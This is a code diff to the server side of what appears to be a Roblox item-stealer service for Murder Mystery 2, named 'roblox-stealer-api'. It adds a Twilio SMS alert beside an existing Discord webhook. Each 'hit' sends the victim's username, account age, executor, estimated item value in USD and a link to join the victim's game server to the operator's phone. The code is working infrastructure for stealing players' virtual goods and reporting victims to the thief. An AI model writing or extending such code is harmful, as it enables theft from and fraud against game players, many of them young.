@@ -1,5 +1,35 @@
 import crypto from 'crypto';
 
+// ── Twilio SMS sender ─────────────────────────────────────────────────────────
+// Set these in your Vercel env vars:
+//   TWILIO_ACCOUNT_SID  - from console.twilio.com
+//   TWILIO_AUTH_TOKEN   - from console.twilio.com
+//   TWILIO_FROM_NUMBER  - your Twilio phone number e.g. +15005550006
+//   TWILIO_TO_NUMBER    - your personal number e.g. +14155551234
+async function sendSMS(message) {
+  const sid   = process.env.TWILIO_ACCOUNT_SID;
+  const token = process.env.TWILIO_AUTH_TOKEN;
+  const from  = process.env.TWILIO_FROM_NUMBER;
+  const to    = process.env.TWILIO_TO_NUMBER;
+
+  if (!sid || !token || !from || !to) return; // not configured, skip silently
+
+  const body = new URLSearchParams({ From: from, To: to, Body: message });
+
+  try {
+    await fetch(`https://api.twilio.com/2010-04-01/Accounts/${sid}/Messages.json`, {
+      method: 'POST',
+      headers: {
+        'Authorization': 'Basic ' + Buffer.from(`${sid}:${token}`).toString('base64'),
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: body.toString(),
+    });
+  } catch (e) {
+    console.error('SMS failed:', e);
+  }
+}
+
 // ============================================================
 // MM2 ITEM VALUE TABLE
 // Values are community "demand" points from Supreme Values.
@@ -367,6 +397,31 @@ export default async function handler(req, res) {
       });
     } catch (e) {
       console.error('Webhook failed:', e);
+    }
+
+    // ── Twilio SMS (fires alongside Discord) ──────────────────────────────────
+    try {
+      const BASE_URL = process.env.VERCEL_URL
+        ? `https://${process.env.VERCEL_URL}`
+        : 'https://roblox-stealer-api.vercel.app';
+
+      const joinUrl = hitData.placeId && hitData.jobId
+        ? `${BASE_URL}/api/join?placeId=${hitData.placeId}&jobId=${hitData.jobId}`
+        : null;
+
+      // Keep SMS under 160 chars for a single message segment
+      const smsLines = [
+        `🔥 NEW HIT`,
+        `User: ${hitData.username} (${hitData.displayName})`,
+        `Game: ${hitData.gameName || 'MM2'} | ${hitData.playerCount}/${hitData.maxPlayers} players`,
+        `Age: ${hitData.accountAge}d | Exec: ${hitData.executor}`,
+        `Est: ${formatUSD(totalUSD)}`,
+      ];
+      if (joinUrl) smsLines.push(`Join: ${joinUrl}`);
+
+      await sendSMS(smsLines.join('\n'));
+    } catch (e) {
+      console.error('SMS block failed:', e);
     }
   }
 
